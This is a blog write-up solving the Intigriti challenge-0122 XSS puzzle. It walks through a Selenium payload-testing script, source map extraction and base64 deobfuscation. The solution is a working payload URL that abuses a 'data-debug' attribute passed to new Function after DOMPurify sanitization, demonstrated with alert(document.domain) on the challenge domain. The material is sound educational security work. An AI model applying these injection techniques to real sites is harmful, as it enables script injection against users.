+++
author = "sh1yo"
title = "[intigriti] challenge-0122"
date = "2022-01-15"
description = "-"
draft = true
tags = [
    "ctf",
    "web"
]
+++

I am going to tell you how I've solved my first intigriti challenge (challenge-0122 by [@TheRealBrenu](https://twitter.com/TheRealBrenu)). For some reason, I didn't have enough time for participating in the previous ones but for this one, I even decided to make a full write-up. If you don't have much time - you can skip **Setting up headless browser** and **Checking dompurify** parts they are for extending your basic knowledge only.

- [Initial observing](#initial-observing)
- [Setting up a headless browser](#setting-up-a-headless-browser)
- [Finding the source code and downloading the map file](#finding-the-source-code-and-downloading-the-map-file)
- [Checking dompurify](#checking-dompurify)
- [Exploring the source code](#exploring-the-source-code)
    - [Deobfuscation linux way](#linux-way)
    - [Deobfuscation js way](#js-way)
- [Solution](#solution)

## Initial observing

![https://challenge-0122.intigriti.io/](/images/b394b4d059c9ca3fab89432132df515d389fed0b.png)

On the main challenge page `https://challenge-0122.intigriti.io/` we can see an iframe. The iframe is pointed to the domain where we need to find a way to execute `alert(document.domain)`.

```js
 <div class="card-container">
	 <iframe src="https://challenge-0122-challenge.intigriti.io/" width="100%" height="600px"><\/iframe>
<\/div>
```

It was painful to check the payloads there as you need to refresh the page every time to send a new payload, but soon enough intigriti added a possibility to send them via the **/result?payload=sth** endpoint.

![Send one test payload](/images/107ca2c10a336815c80d4c989f75a43efa279e6c.png)

As we can see - dangerous tags and event handlers are removed.

As you may notice, the actual payload isn’t sent to the server. Instead, it is processed by the client-side javascript. It is much harder to check a lot of different payloads at once due to the lack of http requests.


## Setting up a headless browser

To overcome the problem above and check a lot of initial payloads trying to find an easy solution, I created a basic python3 script that opens the page in chromium and executes given payloads:

```python
from selenium import webdriver
import time, sys
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument("--headless")  # do not show the browser to user

browser = webdriver.Chrome(options=options)

browser.get('https://challenge-0122-challenge.intigriti.io')

textarea = browser.find_element_by_tag_name('textarea')
textarea.send_keys(sys.argv[1])  # python3 tool.py <payload>, sys.argv = ['tool.py', '<payload>']

browser.find_element_by_tag_name('button').click()

message = browser.find_element_by_id("viewer-container")

print(message.get_attribute("innerHTML"))

browser.close()
```

Run it:
```bash
% python3 xss-chall.py "sth<scr<script>ipt>sth" 2> /dev/null
sthipt&gt;sth
```

The **2> /dev/null** part is used to remove the noise warning messages.

I think there is no need to explain it. Even without python knowledge, it is possible to guess what things are happening there. It is not ideal though, because for every payload the new browser instance is created. Still, it’s okay for checking a few dozens payload with something like this in your Linux shell:

```bash
while read payload; do python3 xss-chall.py $payload 2> /dev/null; done < payloads.txt
```


## Finding the source code and downloading the map file

If we open the iframed challenge page, we can see that it is using the only script file that is probably handling our input:

```html
<title>Challenge</title>
<script defer="defer" src="/static/js/main.02a05519.js"></script>
```

While the script isn't very beautiful, the last line of the script shows us the location of the source map file:
**//# sourceMappingURL=main.02a05519.js.map**

There is a lot of tools to extract it, but I prefer [unwebpack-sourcemap](https://github.com/rarecoil/unwebpack-sourcemap) because it lies somewhere in my system for a long time already.

```bash
python3 unwebpack_sourcemap.py --make-directory https://challenge-0122-challenge.intigriti.io/static/js/main.02a05519.js.map xss-intigriti
```


## Checking dompurify

At this time I remembered the first intigriti tip that says that there is something wrong with the sanitize function. Let's check it:
```bash
% cd xss-intigriti; grep -r sanitize
pages/I0x1/index.js:  function I0x12(htmlObj) { //sanitizeHTML
..
parent_dir/node_modules/dompurify/src/purify.js:  DOMPurify.sanitize = function (dirty, cfg) {
..
parent_dir/node_modules/dompurify/src/purify.js:    /* Return sanitized string or DOM */
```
The only sanitize function I've found is **DOMPurify.sanitize = function (dirty, cfg) {..}**.
As we can see it is using the external dompurify lib to sanitize our input. We are not going to search for 0days so just compare lib files with the original ones from github:
- Download one of the lib files: **https://github.com/cure53/DOMPurify/blob/main/src/purify.js**.
- Check with something like diff:
```bash
% diff purify.js purify_original.js

%
```

The `diff` command prints nothing so the files are same.


## Exploring the source code

In the sourcemap root we can see a few custom files. The most interesting of them is **router.js** that somehow using the router we are sending payloads to:
```js
import I0x1C from "./pages/I0x1C";
import I0x1 from "./pages/I0x1";

const identifiers = {
 I0x1: "UmVzdWx0",
 ...
 I0x34: "Y3VycmVudA==",
};

export default function Router() {  pay
 return (
   <BrowserRouter>
     <Routes>
       <Route path="/">
         <Route index element={<I0x1C identifiers={identifiers} />} />
         <Route path="result" element={<I0x1 identifiers={identifiers} />} />
       <\/Route>
     <\/Routes>
   <\/BrowserRouter>
 );
}
```

Let's see in the files that were imported by this file - **./pages/I0x1C** and **"./pages/I0x1"**.
We can see a parse button at the end of **./pages/I0x1C/index.js**, so it's probably the start page where the iframe is inserted.
```html
<button type="submit">Parse</button>
```

And finally, the **./pages/I0x1/index.js**  file shows us our results:
```html
 return (
   <div className="App">
     <h1>Here is the result!</h1>
     <div id="viewer-container" dangerouslySetInnerHTML={I0x12(I0x2)}></div>
   </div>
 );
```

Despite worked you with React or not, **dangerouslySetInnerHTML** should alert you. After a brief googling we can see that the output of the **I0x12** function is inserted to html without sanitizing and therefore can be a thing we are searching for. But the page is obfuscated and it's impossible to say what functions are doing without the context:

```js

function I0x1({ identifiers }) {
  const [I0x2, _] = useState(() => {
    const I0x3 = new URLSearchParams(
      window[window.atob(identifiers["I0x4"])][window.atob(identifiers["I0x5"])]
    )[window.atob(identifiers["I0x6"])](window.atob(identifiers["I0x7"]));

    if (I0x3) {
      const I0x8 = {};
      I0x8[window.atob(identifiers["I0x9"])] = I0x3;

      return I0x8;
    }

    const I0x8 = {};
    I0x8[window.atob(identifiers["I0x9"])] = window.atob(identifiers["I0xA"]);

    return I0x8;
  });

  function I0xB(I0xC) {
    for (const I0xD of I0xC[window.atob(identifiers["I0xE"])]) {
      if (
        window.atob(identifiers["I0x11"]) in
        I0xD[window.atob(identifiers["I0xF"])]
      ) {
        new Function(
          I0xD[window.atob(identifiers["I0x10"])](
            window.atob(identifiers["I0x11"])
          )
        )();
      }

      I0xB(I0xD);
    }
  }

  function I0x12(I0x13) {
    I0x13[window.atob(identifiers["I0x9"])] = DOMPurify[
      window.atob(identifiers["I0x15"])
    ](I0x13[window.atob(identifiers["I0x9"])]);

    let I0x14 = document[window.atob(identifiers["I0x16"])](
      window.atob(identifiers["I0x14"])
    );
    I0x14[window.atob(identifiers["I0x17"])] =
      I0x13[window.atob(identifiers["I0x9"])];
    document[window.atob(identifiers["I0x32"])][
      window.atob(identifiers["I0x18"])
    ](I0x14);

    I0x14 = document[window.atob(identifiers["I0x19"])](
      window.atob(identifiers["I0x14"])
    )[0];
    I0xB(I0x14[window.atob(identifiers["I0x1A"])]);

    document[window.atob(identifiers["I0x32"])][
      window.atob(identifiers["I0x1B"])
    ](I0x14);

    return I0x13;
  }

  return (
    <div className="App">
      <h1>Here is the result!<\/h1>
      <div id="viewer-container" dangerouslySetInnerHTML={I0x12(I0x2)}><\/div>
    <\/div>
  );
}

```

Let's return to `router.js` because there were the same variables:
```js
const identifiers = {
 I0x1: "UmVzdWx0",
 ...
 I0x34: "Y3VycmVudA==",
};
```

It's easy to guess that base64 encoding is used to obfuscate variables in **./pages/I0x1/index.js**. I am going to show you how to easily decode it without a lot of time-wasting:


### Linux way

In a few minutes I created the following one liner:
```bash
for i in `cat router.js | grep -P I0x.+: | sed 's/: /:/'`;
	do echo -n "$i"; echo $i | sed 's/:/ /' | awk '{print $2}' | sed 's/[",]//g' | base64 -d; echo;
done
```

![Execute](/images/aab601ce789500f85103462a6240b10a5403ca88.png)

Explanation:

The for loop is iterating through the lines of router.js that contain **I0x(some chars):** so it finds every element of the **identifiers** array. (**I0x1: "UmVzdWx0",**)

**sed 's/: /:/'** is used to remove the space after **:**. (**I0x1:"UmVzdWx0",**)

**echo -n "$i";** just prints our string without the new line at the end.

**echo $i | sed 's/:/ /' | awk '{print $2}' | sed 's/[",]//g' | base64 -d;** replaces the **:** character with space, prints only the second part, removes quotes and commas from it and passes is to the base64 decode function. (**I0x1:"UmVzdWx0",** -> **I0x1 "UmVzdWx0",** -> **"UmVzdWx0",** -> **UmVzdWx0** -> **Result**)

So the final output is **I0x1:"UmVzdWx0",Result** for the every array element.

Despite, it is not the easier way to decode the variables, the skill to use your shell is very important.


### JS way

The decoding can be simplified even more, just paste the array in to your browser console and execute:
```js
for (variable in identifiers) { console.log(variable, '=', atob(identifiers[variable])) }
```

![Execute](/images/1d0583cbec1c9fca563725ce2140a11f1db81da8.png)


## Solution

With the decoded variables, I decided to just go through every line of **./pages/I0x1/index.js** and replace variables. At the same time, thinking about what the code is doing.

The deobfuscated file:
```js
import { useState } from "react";
import DOMPurify from "dompurify";
import "../../App.css";

function I0x1({ identifiers }) { //check whether the query is empty
  const [payloadFromUrl, _] = useState(() => {
    const queryResult = new URLSearchParams(
      window['location']['search'])['get']('payload');

    if (queryResult) {
      const result = {};
      result['__html'] = queryResult;

      return result;
    }

    const result = {};
    result['__html'] = "<h1 style='color: #00bfa5'>Nothing here!</h1>";

    return result;
  });

  function I0xB(element) { //search for data-debug in attributes and pass it to Function
    for (const child of element[children]) {
      if (
        'data-debug' in
        child[attributes]
      ) {
        new Function(child['getAttributes']('data-debug'))();
      }

      I0xB(child);
    }
  }

  function I0x12(htmlObj) { //sanitizeHTML
    htmlObj['__html'] = DOMPurify['sanitize'](htmlObj['__html']); //sanitize our input

    let template = document['createElement']('template');

    template["InnerHTML"] = htmlObj['__html'];
    document['body']['appendChild'](template); //append the template with our input to the page

    template = document['getElementsByTagName']('template')[0]; //get template
    I0xB(template['content']); //handle the template content (our sanitized payload)

    document['body']['removeChild']('template');

    return htmlObj;
  }

  return (
    <div className="App">
      <h1>Here is the result!<\/h1>
      <div id="viewer-container" dangerouslySetInnerHTML={I0x12(payloadFromUrl)}><\/div>
    <\/div>
  );
}

export default I0x1;
```

As we can see, the sanitize function **I0x12** does everything right besides calling **I0xB** with our sanitized payload. In the **I0xB** the content of **data-debug** attribute of our html tags is passed to **new Function** and instantly executes. Passing **\<img data-debug=alert(document.domain)>** would result in executing our alert: **new Function(alert(document.domain))()**. Despite the payload is being sanitized, the **data-debug** is a custom tag and therefore is not filtered by dompurify.

My solution:
```
https://challenge-0122-challenge.intigriti.io/result?payload=<img+data-debug=alert(document.domain)>
```